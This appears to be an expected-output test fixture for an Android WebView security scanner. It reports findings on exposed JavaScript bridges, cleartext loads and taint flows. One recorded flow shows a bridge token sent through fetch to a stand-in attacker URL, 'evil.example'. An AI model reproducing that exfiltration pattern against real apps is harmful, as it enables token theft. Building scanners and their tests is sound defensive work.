@@ -1,0 +1,624 @@
+{
+  "findings": [
+    {
+      "description": "A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.",
+      "evidence": [
+        {
+          "arguments": [
+            "http://evil.example/x?t=tok-123"
+          ],
+          "href": "http://remote.example/page",
+          "sink": "fetch",
+          "sinkUrl": "http://evil.example/x?t=tok-123",
+          "taints": [
+            {
+              "id": "taint-1-0",
+              "source": {
+                "interfaceName": "AppBridge",
+                "methodName": "getToken"
+              },
+              "valuePreview": "tok-123"
+            }
+          ],
+          "timestamp": "2026-01-01T00:00:09.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.",
+      "rule_id": "WV-TAINTED-BRIDGE-DATA-TO-JS-SINK",
+      "severity": "critical",
+      "title": "Sensitive native bridge data reached a JavaScript sink"
+    },
+    {
+      "description": "A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.",
+      "evidence": [
+        {
+          "arguments": [
+            "tok-123",
+            "https://parent.example"
+          ],
+          "href": "http://remote.example/page",
+          "sink": "window.postMessage",
+          "sinkUrl": "https://parent.example",
+          "taints": [
+            {
+              "id": "taint-1-0",
+              "source": {},
+              "valuePreview": "tok-123"
+            }
+          ],
+          "timestamp": "2026-01-01T00:00:10.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.",
+      "rule_id": "WV-TAINTED-BRIDGE-DATA-TO-JS-SINK",
+      "severity": "critical",
+      "title": "Sensitive native bridge data reached a JavaScript sink"
+    },
+    {
+      "description": "A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.",
+      "evidence": [
+        {
+          "arguments": [
+            "k",
+            "tok-123"
+          ],
+          "href": "http://remote.example/page",
+          "sink": "localStorage.setItem",
+          "sinkUrl": null,
+          "taints": [
+            {
+              "id": "taint-1-0",
+              "source": {},
+              "valuePreview": "tok-123"
+            }
+          ],
+          "timestamp": "2026-01-01T00:00:11.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.",
+      "rule_id": "WV-TAINTED-BRIDGE-DATA-TO-JS-SINK",
+      "severity": "critical",
+      "title": "Sensitive native bridge data reached a JavaScript sink"
+    },
+    {
+      "description": "Remote content invoked a native JavaScript bridge method. This is a direct native attack surface from web content.",
+      "evidence": [
+        {
+          "args": [],
+          "attachedOrigin": "http://remote.example",
+          "currentOrigin": "http://remote.example",
+          "error": null,
+          "interfaceName": "AppBridge",
+          "methodName": "getToken",
+          "pageUrl": "http://remote.example/page",
+          "retval": "tok-123",
+          "timestamp": "2026-01-01T00:00:06.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Restrict bridge calls to trusted origins and validate authorization inside the bridge method before performing native actions.",
+      "rule_id": "WV-BRIDGE-CALLED-BY-REMOTE-CONTENT",
+      "severity": "high",
+      "title": "Remote WebView content called a native bridge method"
+    },
+    {
+      "description": "Remote content invoked a native JavaScript bridge method. This is a direct native attack surface from web content.",
+      "evidence": [
+        {
+          "args": [
+            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx..."
+          ],
+          "attachedOrigin": null,
+          "currentOrigin": "http://remote.example",
+          "error": "boom",
+          "interfaceName": "AppBridge",
+          "methodName": "ping",
+          "pageUrl": "http://remote.example/page",
+          "retval": null,
+          "timestamp": "2026-01-01T00:00:07.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Restrict bridge calls to trusted origins and validate authorization inside the bridge method before performing native actions.",
+      "rule_id": "WV-BRIDGE-CALLED-BY-REMOTE-CONTENT",
+      "severity": "high",
+      "title": "Remote WebView content called a native bridge method"
+    },
+    {
+      "description": "The WebView loaded content over HTTP. Cleartext traffic can be intercepted or modified, which is especially dangerous when JavaScript bridges are exposed.",
+      "evidence": [
+        {
+          "source": "loadUrl",
+          "timestamp": "2026-01-01T00:00:00.000Z",
+          "url": "http://remote.example/page",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Use HTTPS for WebView content and disable cleartext traffic in the Android network security configuration.",
+      "rule_id": "WV-CLEARTEXT-URL",
+      "severity": "high",
+      "title": "Cleartext HTTP content loaded in WebView"
+    },
+    {
+      "description": "A native object was exposed to JavaScript through addJavascriptInterface. Any page that can run JavaScript in this WebView can attempt to call annotated public methods.",
+      "evidence": [
+        {
+          "className": "com.example.Bridge",
+          "interfaceName": "AppBridge",
+          "origin": "http://remote.example",
+          "pageUrl": "http://remote.example/page",
+          "timestamp": "2026-01-01T00:00:01.000Z",
+          "trusted": false,
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Expose bridges only to trusted origins, remove the bridge before loading untrusted content, and enforce origin checks in every sensitive method.",
+      "rule_id": "WV-JS-BRIDGE-EXPOSED",
+      "severity": "high",
+      "title": "JavaScript bridge exposed to WebView content"
+    },
+    {
+      "description": "A native object was exposed to JavaScript through addJavascriptInterface. Any page that can run JavaScript in this WebView can attempt to call annotated public methods.",
+      "evidence": [
+        {
+          "className": "com.example.Other",
+          "interfaceName": "Other",
+          "origin": "http://remote.example",
+          "pageUrl": "http://remote.example/page",
+          "timestamp": "2026-01-01T00:00:02.000Z",
+          "trusted": false,
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Expose bridges only to trusted origins, remove the bridge before loading untrusted content, and enforce origin checks in every sensitive method.",
+      "rule_id": "WV-JS-BRIDGE-EXPOSED",
+      "severity": "high",
+      "title": "JavaScript bridge exposed to WebView content"
+    },
+    {
+      "description": "A JavaScript bridge exposes a method whose name suggests access to sensitive data, permissions, files, device identifiers, or device capabilities.",
+      "evidence": [
+        {
+          "args": [],
+          "className": "com.example.Bridge",
+          "interfaceName": "AppBridge",
+          "method": "getToken",
+          "timestamp": "2026-01-01T00:00:03.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Audit the method implementation, require trusted-origin checks, and avoid returning sensitive native data directly to JavaScript.",
+      "rule_id": "WV-SENSITIVE-BRIDGE-METHOD",
+      "severity": "high",
+      "title": "Sensitive-looking JavaScript bridge method exposed"
+    },
+    {
+      "description": "A JavaScript bridge exposes a method whose name suggests access to sensitive data, permissions, files, device identifiers, or device capabilities.",
+      "evidence": [
+        {
+          "args": [
+            "java.lang.String"
+          ],
+          "className": "com.example.Ghost",
+          "interfaceName": "Ghost",
+          "method": "readFile",
+          "timestamp": "2026-01-01T00:00:05.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Audit the method implementation, require trusted-origin checks, and avoid returning sensitive native data directly to JavaScript.",
+      "rule_id": "WV-SENSITIVE-BRIDGE-METHOD",
+      "severity": "high",
+      "title": "Sensitive-looking JavaScript bridge method exposed"
+    },
+    {
+      "description": "JavaScript running inside the WebView made or prepared a cleartext HTTP request.",
+      "evidence": [
+        {
+          "api": "fetch",
+          "href": "http://remote.example/page",
+          "timestamp": "2026-01-01T00:00:09.000Z",
+          "url": "http://evil.example/x?t=tok-123",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "recommendation": "Use HTTPS endpoints and apply Content Security Policy or application-level URL allowlists.",
+      "rule_id": "WV-JS-CLEARTEXT-NETWORK",
+      "severity": "medium",
+      "title": "WebView JavaScript contacted a cleartext URL"
+    },
+    {
+      "description": "Static analysis found an addJavascriptInterface registration that the dynamic run never executed. The bridge is still part of the app's attack surface.",
+      "evidence": [
+        {
+          "callSite": "com.example.Main.attach(java.lang.Object)",
+          "candidateClasses": [
+            "com.example.Legacy",
+            "com.example.Spare"
+          ],
+          "className": null,
+          "classResolution": "ambiguous",
+          "interfaceName": null,
+          "methods": [],
+          "nameStatus": "unresolved",
+          "sensitiveMethods": []
+        }
+      ],
+      "recommendation": "Exercise the code path that registers this bridge (see call site) and review its exposed methods, especially those flagged sensitive.",
+      "rule_id": "WV-STATIC-BRIDGE-UNOBSERVED",
+      "severity": "info",
+      "title": "JavaScript bridge found in the APK but not observed at runtime"
+    },
+    {
+      "description": "Static analysis found an addJavascriptInterface registration that the dynamic run never executed. The bridge is still part of the app's attack surface.",
+      "evidence": [
+        {
+          "callSite": "com.example.Main.onCreate(android.os.Bundle)",
+          "candidateClasses": [
+            "com.example.Legacy"
+          ],
+          "className": "com.example.Legacy",
+          "classResolution": "exact",
+          "interfaceName": "Legacy",
+          "methods": [
+            "getClass",
+            "readFile"
+          ],
+          "nameStatus": "resolved",
+          "sensitiveMethods": [
+            "readFile"
+          ]
+        }
+      ],
+      "recommendation": "Exercise the code path that registers this bridge (see call site) and review its exposed methods, especially those flagged sensitive.",
+      "rule_id": "WV-STATIC-BRIDGE-UNOBSERVED",
+      "severity": "info",
+      "title": "JavaScript bridge found in the APK but not observed at runtime"
+    }
+  ],
+  "origin_bridge_map": {
+    "android.webkit.WebView:111": {
+      "origins": {
+        "http://remote.example": {
+          "bridges": [
+            {
+              "attachedOrigin": "http://remote.example",
+              "attachedPageUrl": "http://remote.example/page",
+              "calls": [
+                {
+                  "args": [],
+                  "attachedOrigin": "http://remote.example",
+                  "currentOrigin": "http://remote.example",
+                  "error": null,
+                  "methodName": "getToken",
+                  "pageUrl": "http://remote.example/page",
+                  "retval": "tok-123",
+                  "timestamp": "2026-01-01T00:00:06.000Z"
+                },
+                {
+                  "args": [
+                    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx..."
+                  ],
+                  "attachedOrigin": null,
+                  "currentOrigin": "http://remote.example",
+                  "error": "boom",
+                  "methodName": "ping",
+                  "pageUrl": "http://remote.example/page",
+                  "retval": null,
+                  "timestamp": "2026-01-01T00:00:07.000Z"
+                }
+              ],
+              "className": "com.example.Bridge",
+              "interfaceName": "AppBridge",
+              "methods": [
+                "getToken",
+                "ping"
+              ]
+            },
+            {
+              "attachedOrigin": "http://remote.example",
+              "attachedPageUrl": "http://remote.example/page",
+              "calls": [],
+              "className": "com.example.Other",
+              "interfaceName": "Other",
+              "methods": []
+            }
+          ],
+          "page_urls": [
+            "http://remote.example/page"
+          ],
+          "remote": true,
+          "trusted": false
+        },
+        "unknown": {
+          "bridges": [
+            {
+              "attachedOrigin": null,
+              "attachedPageUrl": null,
+              "calls": [],
+              "className": "com.example.Ghost",
+              "interfaceName": "Ghost",
+              "methods": [
+                "readFile"
+              ]
+            }
+          ],
+          "page_urls": [],
+          "remote": false,
+          "trusted": false
+        }
+      }
+    }
+  },
+  "static_bridges": {
+    "all_public_methods_exposed": true,
+    "bridges": [
+      {
+        "className": null,
+        "interfaceName": null,
+        "provenance": "static-only",
+        "registered_in": [
+          "com.example.Main.attach(java.lang.Object)"
+        ],
+        "runtime_methods": [],
+        "runtime_webviews": [],
+        "sensitive_methods": [],
+        "static": {
+          "call_site": {
+            "class": "com.example.Main",
+            "method": "attach",
+            "signature": "attach(java.lang.Object)"
+          },
+          "candidate_classes": [
+            "com.example.Legacy",
+            "com.example.Spare"
+          ],
+          "class_name": null,
+          "class_resolution": "ambiguous",
+          "methods": [],
+          "name": null,
+          "name_source": {
+            "kind": "method-result",
+            "ref": "com.example.Cfg.bridgeName()"
+          },
+          "name_status": "unresolved",
+          "webview_receiver": "verified"
+        }
+      },
+      {
+        "className": "com.example.Legacy",
+        "interfaceName": "Legacy",
+        "provenance": "static-only",
+        "registered_in": [
+          "com.example.Main.onCreate(android.os.Bundle)"
+        ],
+        "runtime_methods": [],
+        "runtime_webviews": [],
+        "sensitive_methods": [
+          "readFile"
+        ],
+        "static": {
+          "call_site": {
+            "class": "com.example.Main",
+            "method": "onCreate",
+            "signature": "onCreate(android.os.Bundle)"
+          },
+          "candidate_classes": [
+            "com.example.Legacy"
+          ],
+          "class_name": "com.example.Legacy",
+          "class_resolution": "exact",
+          "methods": [
+            {
+              "declared_in": "java.lang.Object",
+              "exposure": "public-pre-17",
+              "name": "getClass",
+              "params": [],
+              "returns": "java.lang.Class",
+              "sensitive": false
+            },
+            {
+              "declared_in": "com.example.Legacy",
+              "exposure": "public-pre-17",
+              "name": "readFile",
+              "params": [
+                "java.lang.String"
+              ],
+              "returns": "java.lang.String",
+              "sensitive": true
+            }
+          ],
+          "name": "Legacy",
+          "name_source": {
+            "kind": "const-string",
+            "ref": null
+          },
+          "name_status": "resolved",
+          "webview_receiver": "verified"
+        }
+      },
+      {
+        "className": "com.example.Bridge",
+        "interfaceName": "AppBridge",
+        "provenance": "runtime-only",
+        "registered_in": [],
+        "runtime_methods": [
+          "getToken",
+          "ping"
+        ],
+        "runtime_webviews": [
+          "android.webkit.WebView:111"
+        ],
+        "sensitive_methods": [
+          "getToken"
+        ],
+        "static": null
+      },
+      {
+        "className": "com.example.Other",
+        "interfaceName": "Other",
+        "provenance": "runtime-only",
+        "registered_in": [],
+        "runtime_methods": [],
+        "runtime_webviews": [
+          "android.webkit.WebView:111"
+        ],
+        "sensitive_methods": [],
+        "static": null
+      }
+    ],
+    "counts": {
+      "bridge_classes": 3,
+      "registrations": 2,
+      "runtime_only": 2,
+      "static_and_runtime": 0,
+      "static_only": 2,
+      "unresolved_names": 1
+    },
+    "error": null,
+    "removals": [
+      {
+        "call_site": {
+          "class": "com.example.Main",
+          "dex": "classes.dex",
+          "method": "onDestroy",
+          "offset": 3,
+          "signature": "onDestroy()"
+        },
+        "name": "Legacy",
+        "name_source": {
+          "kind": "const-string",
+          "ref": null
+        },
+        "name_status": "resolved"
+      }
+    ],
+    "status": "completed",
+    "target_sdk": 16,
+    "unregistered_classes": [
+      {
+        "class_name": "com.example.Unused",
+        "methods": [
+          {
+            "declared_in": "com.example.Unused",
+            "exposure": "annotation",
+            "name": "ping",
+            "params": [],
+            "returns": "java.lang.String",
+            "sensitive": false
+          }
+        ],
+        "registered": false,
+        "superclass": "java.lang.Object"
+      }
+    ]
+  },
+  "summary": {
+    "event_count": 12,
+    "finding_count": 13,
+    "risk_score": 100,
+    "severity_counts": {
+      "critical": 3,
+      "high": 7,
+      "info": 2,
+      "low": 0,
+      "medium": 1
+    },
+    "skipped_line_count": 0,
+    "trusted_origins": [],
+    "webview_count": 1
+  },
+  "webviews": {
+    "android.webkit.WebView:111": {
+      "bridge_call_count": 2,
+      "bridge_exposure_count": 2,
+      "bridge_method_count": 3,
+      "bridges": {
+        "AppBridge": {
+          "className": "com.example.Bridge",
+          "origin": "http://remote.example",
+          "pageUrl": "http://remote.example/page",
+          "trusted": false
+        },
+        "Other": {
+          "className": "com.example.Other",
+          "origin": "http://remote.example",
+          "pageUrl": "http://remote.example/page",
+          "trusted": false
+        }
+      },
+      "js_event_count": 4,
+      "origins": [
+        "http://remote.example"
+      ],
+      "permission_event_count": 0,
+      "settings": {},
+      "taint_flow_count": 3,
+      "taint_flows": [
+        {
+          "arguments": [
+            "http://evil.example/x?t=tok-123"
+          ],
+          "href": "http://remote.example/page",
+          "sink": "fetch",
+          "sinkUrl": "http://evil.example/x?t=tok-123",
+          "taints": [
+            {
+              "id": "taint-1-0",
+              "source": {
+                "interfaceName": "AppBridge",
+                "methodName": "getToken"
+              },
+              "valuePreview": "tok-123"
+            }
+          ],
+          "timestamp": "2026-01-01T00:00:09.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        },
+        {
+          "arguments": [
+            "tok-123",
+            "https://parent.example"
+          ],
+          "href": "http://remote.example/page",
+          "sink": "window.postMessage",
+          "sinkUrl": "https://parent.example",
+          "taints": [
+            {
+              "id": "taint-1-0",
+              "source": {},
+              "valuePreview": "tok-123"
+            }
+          ],
+          "timestamp": "2026-01-01T00:00:10.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        },
+        {
+          "arguments": [
+            "k",
+            "tok-123"
+          ],
+          "href": "http://remote.example/page",
+          "sink": "localStorage.setItem",
+          "sinkUrl": null,
+          "taints": [
+            {
+              "id": "taint-1-0",
+              "source": {},
+              "valuePreview": "tok-123"
+            }
+          ],
+          "timestamp": "2026-01-01T00:00:11.000Z",
+          "webViewId": "android.webkit.WebView:111"
+        }
+      ],
+      "taint_source_count": 1,
+      "urls": [
+        "http://remote.example/page"
+      ]
+    }
+  }
+}
